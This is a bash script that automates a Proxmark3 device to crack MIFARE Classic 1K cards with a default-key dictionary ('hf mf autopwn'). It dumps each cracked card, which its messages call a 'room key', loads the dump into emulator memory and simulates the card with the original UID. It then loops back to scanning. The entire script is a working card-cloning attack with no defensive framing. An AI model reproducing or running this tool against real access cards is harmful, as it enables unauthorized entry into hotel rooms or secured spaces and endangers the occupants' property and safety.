#!/bin/bash

# Outer loop to keep the script running indefinitely
while true; do
    # Inner loop for scanning
    echo "Scanning now..."
    while true; do
        # Run the command and capture the output
        output=$(/home/kali/src/proxmark3/pm3 -c "hf mf autopwn --1k -f mfc_default_keys")

        # Check if the output contains "bytes to binary file" and extract the filename
        if echo "$output" | grep -q "bytes to binary file"; then
            # Extract the filename without the path
            dump_file=$(echo "$output" | grep -oP '(?<=Saved ).* bytes to binary file `\K[^`]+')
            filename=$(basename "$dump_file")

            # Extract the string between "mf-" and "-dump"
            hex_string=$(echo "$filename" | grep -oP '(?<=mf-).*(?=-dump)')

            echo "Room key dump saved: $filename"
            echo "Exiting loop."
            echo "Room key UID: $hex_string"
            echo "Loading room key dump into emulator memory..."
            eload=$(pm3 -c "hf mf eload -f $filename")
            echo "Dump loaded."
            echo "Starting room key card simulator..."
            pm3 -c "hf mf sim --1k --u $hex_string -v"
            echo "Simulator running. Press Enter to save simulator memory to file and return to scan mode..."
            read -p ""  # Wait for Enter key press
            esave=$(pm3 -c "hf mf esave --1k -f $hex_string.eml")
            echo "Emulation file saved -- $hex_string.eml.bin"
            echo "Clearing simulator memory..."
            eclear=$(pm3 -c "hf mf eclr") 
            echo "Simulator memory cleared."
            break  # Exit the inner loop to restart scanning
        fi

        # Sleep for a short interval before trying again (optional but recommended)
        sleep 0.5
        echo "Still scanning..."
    done
done

echo "Done."